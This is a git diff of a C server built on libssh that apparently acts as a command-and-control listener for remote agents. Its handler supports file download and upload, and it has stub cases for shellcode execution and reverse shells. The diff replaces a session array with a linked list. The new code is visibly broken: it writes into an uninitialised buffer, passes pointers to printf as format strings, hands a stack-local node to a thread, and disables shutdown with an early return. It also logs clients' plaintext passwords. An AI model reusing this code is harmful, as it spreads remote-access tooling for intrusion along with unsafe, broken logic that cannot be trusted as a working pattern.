@@ -20,6 +20,7 @@ http://api.libssh.org/stable/libssh_tutorial.html
 
 #include "agents.h"
 #include "misc.h"
+#include "list.h"
 
 #ifdef HAVE_ARGP_H
 #include <argp.h>
@@ -281,7 +282,9 @@ static struct argp argp = {options, parse_opt, args_doc, doc, NULL, NULL, NULL};
 
 
 
-void agent_handler(struct clientDat agent){
+void agent_handler(struct clientNode node){
+    printf("Started handler\n");
+    struct clientDat agent = *node.data;
     char resp[2048];
     char *ptr = &resp;
 
@@ -292,12 +295,15 @@ void agent_handler(struct clientDat agent){
             
     while (!quitting)
     {
+        // botched here
         ssh_channel_read(agent.chan, resp, sizeof(resp), 0);
+        printf("read channel\n");
         // this seems wrong...
         char tmpbf[3];
         strncat(tmpbf,resp,index_of(resp, '|', 0));
         operation = atoi(tmpbf);
         ptr += index_of(resp, '|', 0);
+        printf("Pop goes the weazle\n");
 
         /*
         Command data structure:
@@ -312,8 +318,9 @@ void agent_handler(struct clientDat agent){
         switch (operation)
         {
         case AGENT_EXIT:
+            printf("Agent exit caught\n");
             pthread_mutex_lock(&session_lock);
-            session_array[agent.id] = NULL;
+            remove_node(node);
             pthread_mutex_unlock(&session_lock);
             ssh_channel_close(agent.chan);
             ssh_free(agent.session);
@@ -322,6 +329,7 @@ void agent_handler(struct clientDat agent){
             break;
 
         case AGENT_DOWN_FILE:
+            printf("Agent download caught\n");
         /*ADD CHECKS IN HERE FOR SAFETY*/
             memset(buff, 0, sizeof(buff));
             ssh_channel_write(agent.chan, "fn", 3);
@@ -347,6 +355,7 @@ void agent_handler(struct clientDat agent){
             break;
 
         case AGENT_UP_FILE:
+            printf("Agent upload caught\n");
             /*ADD CHECKS IN HERE FOR SAFETY*/
             
             // gets file name
@@ -375,9 +384,11 @@ void agent_handler(struct clientDat agent){
             break;
 
         case AGENT_EXEC_SC:
+            printf("Agent shell caught\n");
             break;
 
         case AGENT_REV_SHELL:
+            printf("Agent reverse shell caught\n");
             break;
 
         default:
@@ -390,7 +401,8 @@ void agent_handler(struct clientDat agent){
 
 
 void *ssh_handler(void* sess){
-    struct clientDat pass = *(struct clientDat*) sess;
+    struct clientNode node = *(struct clientNode*) sess;
+    struct clientDat pass = *node.data;
 
     ssh_message message;
     int sftp = 0;
@@ -501,7 +513,7 @@ void *ssh_handler(void* sess){
         ssh_channel_write(pass.chan, tasking, strlen(tasking));
         
         // Pass to handler
-        agent_handler(pass);
+        agent_handler(node);
         
         break;
     default:
@@ -517,20 +529,9 @@ void *ssh_handler(void* sess){
     return NULL;
 }
 
-int get_free(){
-    pthread_mutex_lock(&session_lock);
-    for (size_t i = 0; i < MAX_CONN; i++)
-    {
-        if(session_array[i] == NULL){
-            pthread_mutex_unlock(&session_lock);
-            return i;
-        }
-    }
-    pthread_mutex_unlock(&session_lock);
-    return -1;
-}
-
+// REWORK
 void handleTerm(int term){
+    return;
     printf("Terminating...\n");
     int termTime = 10;
     int curr = 0;
@@ -592,14 +593,15 @@ int main(int argc, char **argv){
     int master_socket;
     int ctr = 0;
     pthread_t thread;
+    struct clientNode first;
+    first.data = NULL;
+    first.nxt = NULL;
+    first.prev = NULL;
+    struct clientNode *current;
+    current = &first;
 
-    init();
-    
-    for (size_t i = 0; i < MAX_CONN; i++)
-    {
-        session_array[i] = NULL;
-    }
-    
+    // Initialize directories
+    init();    
 
     struct sockaddr_in address;
 
@@ -647,82 +649,85 @@ int main(int argc, char **argv){
     
     // accept connections
     while (!quitting){
-        ctr = get_free();
-        if (ctr == -1) {
-            printf("Server: Hit max concurrent connections. Waiting for free sessions...\n");
-            sleep(10);
-            ctr = get_free();
-        
-        } else {
-            printf("Server: Found free session at index %d\n", ctr);
-            session=ssh_new();
+        printf("Server: Found free session at index %d\n", ctr);
+        session=ssh_new();
 
-            r=ssh_bind_accept(sshbind,session);
-	        printf("Server: Accepting connection\n");
-            if(r==SSH_ERROR){
-      	        printf("Error accepting a connection : %s\n",ssh_get_error(sshbind));
-      	        return 1;
-            }
-            if (ssh_handle_key_exchange(session)) {
-                printf("ssh_handle_key_exchange: %s\n", ssh_get_error(session));
-                return 1;
-            }
-
-            auth = 0;
-            do {
-                message=ssh_message_get(session);
-                if(!message)
-                    break;
-                switch(ssh_message_type(message)){
-                    case SSH_REQUEST_AUTH:
-                        switch(ssh_message_subtype(message)){
-                            case SSH_AUTH_METHOD_PASSWORD:
-                                printf("Server: User %s wants to auth with pass %s\n", ssh_message_auth_user(message), ssh_message_auth_password(message));
-                                if(auth_password(ssh_message_auth_user(message), ssh_message_auth_password(message))){
-                                    auth=1;
-                                    ssh_message_auth_reply_success(message,0);
-                                    break;
-                           	    }
-                            // not authenticated, send default message
-                            case SSH_AUTH_METHOD_NONE:
-                            default:
-                                ssh_message_auth_set_methods(message,SSH_AUTH_METHOD_PASSWORD);
-                                ssh_message_reply_default(message);
-                                break;
-                        }
-                        break;
-                    default:
-                        ssh_message_reply_default(message);
-                }
-                ssh_message_free(message);
-            } while (!auth);
-    
-            // Check if the client authenticated successfully
-	        if(!auth){
-                printf("auth error: %s\n",ssh_get_error(session));
-                ssh_disconnect(session);
-                break;
-            }
-            pthread_mutex_lock(&session_lock);
-            session_array[ctr] = session;
-            pthread_mutex_unlock(&session_lock);
-
-            struct clientDat pass;
-            pass.id = ctr;
-            pass.session = session_array[ctr];
-    
-            // Pass the connection off to the handler
-            if(pthread_create(&thread, NULL, ssh_handler, &pass)){
-                printf("Error creating thread\n");
-                ssh_disconnect(session);
-                break;
-
-            }
-
-            printf("Server: Passed session to thread...\n");
-
-            thread_array[ctr] = thread;	
+        r=ssh_bind_accept(sshbind,session);
+	    printf("Server: Accepting connection\n");
+        if(r==SSH_ERROR){
+      	    printf("Error accepting a connection : %s\n",ssh_get_error(sshbind));
+      	    return 1;
         }
+        if (ssh_handle_key_exchange(session)) {
+            printf("ssh_handle_key_exchange: %s\n", ssh_get_error(session));
+            return 1;
+        }
+
+        auth = 0;
+        do {
+            message=ssh_message_get(session);
+            if(!message)
+                break;
+            switch(ssh_message_type(message)){
+                case SSH_REQUEST_AUTH:
+                    switch(ssh_message_subtype(message)){
+                        case SSH_AUTH_METHOD_PASSWORD:
+                            printf("Server: User %s wants to auth with pass %s\n", ssh_message_auth_user(message), ssh_message_auth_password(message));
+                            if(auth_password(ssh_message_auth_user(message), ssh_message_auth_password(message))){
+                                auth=1;
+                                ssh_message_auth_reply_success(message,0);
+                                break;
+                           	}
+                        // not authenticated, send default message
+                        case SSH_AUTH_METHOD_NONE:
+                        default:
+                            ssh_message_auth_set_methods(message,SSH_AUTH_METHOD_PASSWORD);
+                            ssh_message_reply_default(message);
+                            break;
+                    }
+                    break;
+                default:
+                    ssh_message_reply_default(message);
+            }
+            ssh_message_free(message);
+        } while (!auth);
+    
+        // Check if the client authenticated successfully
+	    if(!auth){
+            printf("auth error: %s\n",ssh_get_error(session));
+            ssh_disconnect(session);
+            break;
+        }
+
+        struct clientDat pass;
+        pass.id = ctr;
+        pass.session = session;
+        pass.trans_id = rand();
+
+        pthread_mutex_lock(&session_lock);
+        printf(current);
+        while(current->nxt != NULL){
+            printf(current->nxt);
+            current = current->nxt;
+        }
+        struct clientNode node;
+        node.data = &pass;
+        node.nxt = NULL;
+        node.prev = NULL;
+        app_node(node, *current);
+        pthread_mutex_unlock(&session_lock);
+            
+    
+        // Pass the connection off to the handler
+        if(pthread_create(&thread, NULL, ssh_handler, &node)){
+            printf("Error creating thread\n");
+            ssh_disconnect(session);
+            break;
+        }
+
+        printf("Server: Passed session to thread...\n");
+
+        thread_array[ctr] = thread;	
     }
         
         
